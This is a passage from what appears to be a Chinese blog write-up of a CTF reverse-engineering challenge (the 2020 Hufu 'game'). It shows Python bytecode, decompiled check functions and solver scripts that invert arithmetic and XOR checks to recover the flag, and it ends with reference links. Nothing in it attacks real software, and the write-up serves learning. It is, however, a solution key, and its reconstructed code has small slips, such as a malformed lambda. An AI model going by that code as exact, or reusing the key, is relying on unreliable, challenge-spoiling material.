class="line">       131_0  COME_FROM           109  &#x27;109&#x27;</span><br><span class="line">         131  POP_JUMP_IF_FALSE   138  &#x27;to 138&#x27;</span><br><span class="line"></span><br><span class="line">  16     134  LOAD_GLOBAL           1  &#x27;True&#x27;</span><br><span class="line">         137  RETURN_END_IF</span><br><span class="line">       138_0  COME_FROM           131  &#x27;131&#x27;</span><br><span class="line"></span><br><span class="line">  18     138  LOAD_GLOBAL           2  &#x27;False&#x27;</span><br><span class="line">         141  RETURN_VALUE</span><br><span class="line">         142  LOAD_CONST               None</span><br><span class="line">         145  RETURN_VALUE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def check2(s):</span><br><span class="line">    if (((((ord(s[0]) * 128 + ord(s[1])) * 128 + ord(s[2])) * 128 + ord(s[3])) * 128 + ord(s[4])) * 128 + ord(s[5]) == 3533889469877) and (ord(s[-1]) == 125):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#check2</span></span><br><span class="line">s  = <span class="number">3533889469877</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">6</span>):</span><br><span class="line">     ch =<span class="built_in">chr</span>(s%<span class="number">128</span>)</span><br><span class="line">     flag[<span class="number">5</span>-x]= ch</span><br><span class="line">     s=s//<span class="number">128</span></span><br><span class="line">flag[-<span class="number">1</span>]=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#前面限定了字符的范围为32-128。</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="check-3"><a href="#check-3" class="headerlink" title="check 3"></a>check 3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># check3 line 20 of game.py</span><br><span class="line"></span><br><span class="line">  21       0  LOAD_GLOBAL           0  &#x27;map&#x27;</span><br><span class="line">           3  LOAD_GLOBAL           1  &#x27;ord&#x27;</span><br><span class="line">           6  LOAD_FAST             0  &#x27;s&#x27;</span><br><span class="line">           9  CALL_FUNCTION_2       2  None</span><br><span class="line">          12  STORE_FAST            1  &#x27;arr&#x27;</span><br><span class="line"></span><br><span class="line">  22      15  LOAD_FAST             1  &#x27;arr&#x27;</span><br><span class="line">          18  LOAD_CONST               6</span><br><span class="line">          21  LOAD_CONST               30</span><br><span class="line">          24  LOAD_CONST               3</span><br><span class="line">          27  BUILD_SLICE_3         3</span><br><span class="line">          30  BINARY_SUBSCR</span><br><span class="line">          31  STORE_FAST            2  &#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">  23      34  SETUP_LOOP           62  &#x27;to 99&#x27;</span><br><span class="line">          37  LOAD_GLOBAL           2  &#x27;range&#x27;</span><br><span class="line">          40  LOAD_GLOBAL           3  &#x27;len&#x27;</span><br><span class="line">          43  LOAD_FAST             2  &#x27;a&#x27;</span><br><span class="line">          46  CALL_FUNCTION_1       1  None</span><br><span class="line">          49  CALL_FUNCTION_1       1  None</span><br><span class="line">          52  GET_ITER</span><br><span class="line">          53  FOR_ITER             42  &#x27;to 98&#x27;</span><br><span class="line">          56  STORE_FAST            3  &#x27;i&#x27;</span><br><span class="line"></span><br><span class="line">  24      59  LOAD_FAST             2  &#x27;a&#x27;</span><br><span class="line">          62  LOAD_FAST             3  &#x27;i&#x27;</span><br><span class="line">          65  BINARY_SUBSCR</span><br><span class="line">          66  LOAD_CONST               17684</span><br><span class="line">          69  BINARY_MULTIPLY</span><br><span class="line">          70  LOAD_CONST               372511</span><br><span class="line">          73  BINARY_ADD</span><br><span class="line">          74  LOAD_CONST               257</span><br><span class="line">          77  BINARY_MODULO</span><br><span class="line">          78  LOAD_GLOBAL           4  &#x27;arr0&#x27;</span><br><span class="line">          81  LOAD_FAST             3  &#x27;i&#x27;</span><br><span class="line">          84  BINARY_SUBSCR</span><br><span class="line">          85  COMPARE_OP            3  !=</span><br><span class="line">          88  POP_JUMP_IF_FALSE    53  &#x27;to 53&#x27;</span><br><span class="line"></span><br><span class="line">  25      91  LOAD_GLOBAL           5  &#x27;False&#x27;</span><br><span class="line">          94  RETURN_END_IF</span><br><span class="line">        95_0  COME_FROM            88  &#x27;88&#x27;</span><br><span class="line">          95  JUMP_BACK            53  &#x27;to 53&#x27;</span><br><span class="line">          98  POP_BLOCK</span><br><span class="line">        99_0  COME_FROM            34  &#x27;34&#x27;</span><br><span class="line"></span><br><span class="line">  26      99  LOAD_FAST             1  &#x27;arr&#x27;</span><br><span class="line">         102  LOAD_CONST               -2</span><br><span class="line">         105  LOAD_CONST               33</span><br><span class="line">         108  LOAD_CONST               -1</span><br><span class="line">         111  BUILD_SLICE_3         3</span><br><span class="line">         114  BINARY_SUBSCR</span><br><span class="line">         115  LOAD_CONST               5</span><br><span class="line">         118  BINARY_MULTIPLY</span><br><span class="line">         119  STORE_FAST            4  &#x27;b&#x27;</span><br><span class="line"></span><br><span class="line">  27     122  LOAD_GLOBAL           0  &#x27;map&#x27;</span><br><span class="line">         125  LOAD_LAMBDA              &#x27;&lt;code_object &lt;lambda&gt;&gt;&#x27;</span><br><span class="line">         128  MAKE_FUNCTION_0       0  None</span><br><span class="line">         131  LOAD_GLOBAL           6  &#x27;zip&#x27;</span><br><span class="line">         134  LOAD_FAST             4  &#x27;b&#x27;</span><br><span class="line">         137  LOAD_FAST             1  &#x27;arr&#x27;</span><br><span class="line">         140  LOAD_CONST               7</span><br><span class="line">         143  LOAD_CONST               27</span><br><span class="line">         146  SLICE+3</span><br><span class="line">         147  CALL_FUNCTION_2       2  None</span><br><span class="line">         150  CALL_FUNCTION_2       2  None</span><br><span class="line">         153  STORE_FAST            5  &#x27;c&#x27;</span><br><span class="line"></span><br><span class="line">  28     156  LOAD_FAST             5  &#x27;c&#x27;</span><br><span class="line">         159  LOAD_GLOBAL           7  &#x27;arr1&#x27;</span><br><span class="line">         162  COMPARE_OP            3  !=</span><br><span class="line">         165  POP_JUMP_IF_FALSE   172  &#x27;to 172&#x27;</span><br><span class="line"></span><br><span class="line">  29     168  LOAD_GLOBAL           5  &#x27;False&#x27;</span><br><span class="line">         171  RETURN_END_IF</span><br><span class="line">       172_0  COME_FROM           165  &#x27;165&#x27;</span><br><span class="line"></span><br><span class="line">  30     172  LOAD_CONST               0</span><br><span class="line">         175  STORE_FAST            6  &#x27;p&#x27;</span><br><span class="line"></span><br><span class="line">  31     178  SETUP_LOOP          105  &#x27;to 286&#x27;</span><br><span class="line">         181  LOAD_GLOBAL           2  &#x27;range&#x27;</span><br><span class="line">         184  LOAD_CONST               28</span><br><span class="line">         187  LOAD_CONST               34</span><br><span class="line">         190  CALL_FUNCTION_2       2  None</span><br><span class="line">         193  GET_ITER</span><br><span class="line">         194  FOR_ITER             88  &#x27;to 285&#x27;</span><br><span class="line">         197  STORE_FAST            3  &#x27;i&#x27;</span><br><span class="line"></span><br><span class="line">  32     200  LOAD_FAST             1  &#x27;arr&#x27;</span><br><span class="line">         203  LOAD_FAST             3  &#x27;i&#x27;</span><br><span class="line">         206  BINARY_SUBSCR</span><br><span class="line">         207  LOAD_CONST               107</span><br><span class="line">         210  BINARY_ADD</span><br><span class="line">         211  LOAD_CONST               16</span><br><span class="line">         214  BINARY_DIVIDE</span><br><span class="line">         215  LOAD_CONST               77</span><br><span class="line">         218  BINARY_ADD</span><br><span class="line">         219  LOAD_GLOBAL           8  &#x27;arr2&#x27;</span><br><span class="line">         222  LOAD_FAST             6  &#x27;p&#x27;</span><br><span class="line">         225  BINARY_SUBSCR</span><br><span class="line">         226  COMPARE_OP            3  !=</span><br><span class="line">         229  POP_JUMP_IF_TRUE    268  &#x27;to 268&#x27;</span><br><span class="line">         232  LOAD_FAST             1  &#x27;arr&#x27;</span><br><span class="line">         235  LOAD_FAST             3  &#x27;i&#x27;</span><br><span class="line">         238  BINARY_SUBSCR</span><br><span class="line">         239  LOAD_CONST               117</span><br><span class="line">         242  BINARY_ADD</span><br><span class="line">         243  LOAD_CONST               16</span><br><span class="line">         246  BINARY_MODULO</span><br><span class="line">         247  LOAD_CONST               99</span><br><span class="line">         250  BINARY_ADD</span><br><span class="line">         251  LOAD_GLOBAL           8  &#x27;arr2&#x27;</span><br><span class="line">         254  LOAD_FAST             6  &#x27;p&#x27;</span><br><span class="line">         257  LOAD_CONST               1</span><br><span class="line">         260  BINARY_ADD</span><br><span class="line">         261  BINARY_SUBSCR</span><br><span class="line">         262  COMPARE_OP            3  !=</span><br><span class="line">       265_0  COME_FROM           229  &#x27;229&#x27;</span><br><span class="line">         265  POP_JUMP_IF_FALSE   272  &#x27;to 272&#x27;</span><br><span class="line"></span><br><span class="line">  33     268  LOAD_GLOBAL           9  &#x27;false&#x27;</span><br><span class="line">         271  RETURN_END_IF</span><br><span class="line">       272_0  COME_FROM           265  &#x27;265&#x27;</span><br><span class="line"></span><br><span class="line">  34     272  LOAD_FAST             6  &#x27;p&#x27;</span><br><span class="line">         275  LOAD_CONST               2</span><br><span class="line">         278  INPLACE_ADD</span><br><span class="line">         279  STORE_FAST            6  &#x27;p&#x27;</span><br><span class="line">         282  JUMP_BACK           194  &#x27;to 194&#x27;</span><br><span class="line">         285  POP_BLOCK</span><br><span class="line">       286_0  COME_FROM           178  &#x27;178&#x27;</span><br><span class="line"></span><br><span class="line">  35     286  LOAD_GLOBAL          10  &#x27;True&#x27;</span><br><span class="line">         289  RETURN_VALUE</span><br><span class="line"> # &lt;lambda&gt; line 27 of game.py</span><br><span class="line"></span><br><span class="line">  27       0  LOAD_FAST             0  &#x27;x&#x27;</span><br><span class="line">           3  LOAD_CONST               0</span><br><span class="line">           6  BINARY_SUBSCR</span><br><span class="line">           7  LOAD_FAST             0  &#x27;x&#x27;</span><br><span class="line">          10  LOAD_CONST               1</span><br><span class="line">          13  BINARY_SUBSCR</span><br><span class="line">          14  BINARY_XOR</span><br><span class="line">          15  RETURN_VALUE</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check3</span>(<span class="params">s</span>):</span><br><span class="line">    arr=<span class="built_in">map</span>(<span class="built_in">ord</span>,s)</span><br><span class="line">    <span class="comment">#map(function, iterable, ...) function -- 函数                iterable -- 一个或多个序列</span></span><br><span class="line">    <span class="comment">#Python 2 返回列表。          Python 3 返回迭代器。</span></span><br><span class="line">    a=arr[<span class="number">6</span>:<span class="number">30</span>:<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(a)):    </span><br><span class="line">        <span class="keyword">if</span> (a[i]*<span class="number">17684</span>+<span class="number">372511</span>)%<span class="number">257</span> != arr0[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    b=arr[-<span class="number">2</span>:<span class="number">33</span>:-<span class="number">1</span>]*<span class="number">5</span>        <span class="comment">#[37, 36, 35, 34],*5表示将切片内容重复五遍</span></span><br><span class="line">    c= <span class="built_in">map</span>(<span class="keyword">lambda</span>:b[<span class="number">0</span>]^b[<span class="number">1</span>],<span class="built_in">zip</span>(b, arr[<span class="number">7</span>:<span class="number">27</span>]) )</span><br><span class="line">    <span class="keyword">if</span> c!= arr1:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment">#zip() 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>,<span class="number">34</span>):</span><br><span class="line">        <span class="keyword">if</span>((arr[i]+<span class="number">107</span>)//<span class="number">16</span>)+<span class="number">77</span>!= arr2[p]  <span class="keyword">or</span>  ((arr[i]+<span class="number">177</span>)%<span class="number">16</span>)+<span class="number">99</span> != arr2[p+<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        p=p+<span class="number">2</span></span><br><span class="line">  <span class="comment">#Python 2 返回元组列表。          Python 3 返回一个对象</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#check3</span></span><br><span class="line"><span class="comment">#slice[start:stop:step]切片获取子序列 包含start，不包含stop</span></span><br><span class="line">arr0 = [<span class="number">249</span>, <span class="number">91</span>, <span class="number">149</span>, <span class="number">113</span>, <span class="number">16</span>, <span class="number">91</span>, <span class="number">53</span>, <span class="number">41</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">     <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">          <span class="keyword">if</span> (ch*<span class="number">17684</span>+<span class="number">372511</span>)%<span class="number">257</span> == arr0[i]:</span><br><span class="line">                flag[<span class="number">6</span>+i*<span class="number">3</span>]=<span class="built_in">chr</span>(ch)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr1 = [<span class="number">43</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">113</span>, <span class="number">6</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">127</span>, <span class="number">60</span>]<span class="comment">#长度为20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag):</span><br><span class="line">     <span class="built_in">print</span>(temp)</span><br><span class="line"><span class="comment">#flag[9]=5,flag[12]=x,flag[15]=i,flag[18]=V,flag[21]=5,flag[24]=P,flag[27]=K</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">7 8 9 10</span></span><br><span class="line"><span class="string">11 12 13 14</span></span><br><span class="line"><span class="string">15 16 17 18</span></span><br><span class="line"><span class="string">19 20 21 22</span></span><br><span class="line"><span class="string">23 24 25 26</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#因为b列表每隔四个元素重复一次，所以只需每一列都有一个元素与arr元素相等即可</span></span><br><span class="line">key= [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">key[<span class="number">0</span>]=<span class="built_in">ord</span>(flag[<span class="number">15</span>])^arr1[<span class="number">8</span>]</span><br><span class="line">key[<span class="number">1</span>]=<span class="built_in">ord</span>(flag[<span class="number">12</span>])^arr1[<span class="number">5</span>]</span><br><span class="line">key[<span class="number">2</span>]=<span class="built_in">ord</span>(flag[<span class="number">9</span>])^arr1[<span class="number">2</span>]</span><br><span class="line">key[<span class="number">3</span>]=<span class="built_in">ord</span>(flag[<span class="number">18</span>])^arr1[<span class="number">11</span>]</span><br><span class="line"></span><br><span class="line">flag[-<span class="number">2</span>] = <span class="built_in">chr</span>(key[<span class="number">0</span>])</span><br><span class="line">flag[-<span class="number">3</span>] = <span class="built_in">chr</span>(key[<span class="number">1</span>])</span><br><span class="line">flag[-<span class="number">4</span>] = <span class="built_in">chr</span>(key[<span class="number">2</span>])</span><br><span class="line">flag[-<span class="number">5</span>] = <span class="built_in">chr</span>(key[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr1)):</span><br><span class="line">     flag[<span class="number">7</span>+i]=<span class="built_in">chr</span>(arr1[i]^key[i%<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag):</span><br><span class="line">     <span class="built_in">print</span>(temp)</span><br><span class="line"></span><br><span class="line">arr2 = [<span class="number">90</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">109</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">90</span>, <span class="number">104</span>, <span class="number">88</span>, <span class="number">102</span>]</span><br><span class="line">tmp2 = <span class="number">28</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(arr2), <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> ((j + <span class="number">107</span>) // <span class="number">16</span>) + <span class="number">77</span> == arr2[i] <span class="keyword">and</span> ((j + <span class="number">117</span>) % <span class="number">16</span>) + <span class="number">99</span> == arr2[i + <span class="number">1</span>]:</span><br><span class="line">            flag[tmp2] = <span class="built_in">chr</span>(j)</span><br><span class="line">            tmp2 = tmp2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag = [<span class="string">&#x27; &#x27;</span>] *<span class="number">39</span></span><br><span class="line"><span class="comment">#check1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">100</span> <span class="keyword">and</span> (x*x)%<span class="number">777</span>^<span class="number">233</span> == <span class="number">513</span>:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#check2</span></span><br><span class="line">s  = <span class="number">3533889469877</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">6</span>):</span><br><span class="line">     ch =<span class="built_in">chr</span>(s%<span class="number">128</span>)</span><br><span class="line">     flag[<span class="number">5</span>-x]= ch</span><br><span class="line">     s=s//<span class="number">128</span></span><br><span class="line">flag[-<span class="number">1</span>]=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment">#check3</span></span><br><span class="line">arr0 = [<span class="number">249</span>, <span class="number">91</span>, <span class="number">149</span>, <span class="number">113</span>, <span class="number">16</span>, <span class="number">91</span>, <span class="number">53</span>, <span class="number">41</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">     <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">          <span class="keyword">if</span> (ch*<span class="number">17684</span>+<span class="number">372511</span>)%<span class="number">257</span> == arr0[i]:</span><br><span class="line">                flag[<span class="number">6</span>+i*<span class="number">3</span>]=<span class="built_in">chr</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr1 = [<span class="number">43</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">69</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">113</span>, <span class="number">6</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">44</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">127</span>, <span class="number">60</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key= [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">key[<span class="number">0</span>]=<span class="built_in">ord</span>(flag[<span class="number">15</span>])^arr1[<span class="number">8</span>]</span><br><span class="line">key[<span class="number">1</span>]=<span class="built_in">ord</span>(flag[<span class="number">12</span>])^arr1[<span class="number">5</span>]</span><br><span class="line">key[<span class="number">2</span>]=<span class="built_in">ord</span>(flag[<span class="number">9</span>])^arr1[<span class="number">2</span>]</span><br><span class="line">key[<span class="number">3</span>]=<span class="built_in">ord</span>(flag[<span class="number">18</span>])^arr1[<span class="number">11</span>]</span><br><span class="line"></span><br><span class="line">flag[-<span class="number">2</span>] = <span class="built_in">chr</span>(key[<span class="number">0</span>])</span><br><span class="line">flag[-<span class="number">3</span>] = <span class="built_in">chr</span>(key[<span class="number">1</span>])</span><br><span class="line">flag[-<span class="number">4</span>] = <span class="built_in">chr</span>(key[<span class="number">2</span>])</span><br><span class="line">flag[-<span class="number">5</span>] = <span class="built_in">chr</span>(key[<span class="number">3</span>])</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr1)):</span><br><span class="line">     flag[<span class="number">7</span>+i]=<span class="built_in">chr</span>(arr1[i]^key[i%<span class="number">4</span>])</span><br><span class="line">     </span><br><span class="line">arr2 = [<span class="number">90</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">109</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">90</span>, <span class="number">104</span>, <span class="number">88</span>, <span class="number">102</span>]</span><br><span class="line">tmp2 = <span class="number">28</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(arr2), <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> ((j + <span class="number">107</span>) // <span class="number">16</span>) + <span class="number">77</span> == arr2[i] <span class="keyword">and</span> ((j + <span class="number">117</span>) % <span class="number">16</span>) + <span class="number">99</span> == arr2[i + <span class="number">1</span>]:</span><br><span class="line">            flag[tmp2] = <span class="built_in">chr</span>(j)</span><br><span class="line">            tmp2 = tmp2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>参考博客</p><p><a href="https://www.cnblogs.com/Mayfly-nymph/p/12764537.html">虎符网络安全赛道 Re Game - Hk_Mayfly - 博客园 (cnblogs.com)</a></p><p><a href="https://www.jianshu.com/p/437db44202b2">2020-虎符网络安全赛道-Re-game - 简书 (jianshu.com)</a></p><p><a href="https://bbs.kanxue.com/thread-259021.htm">[原创]python字节码逆向题 虎符第一题-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
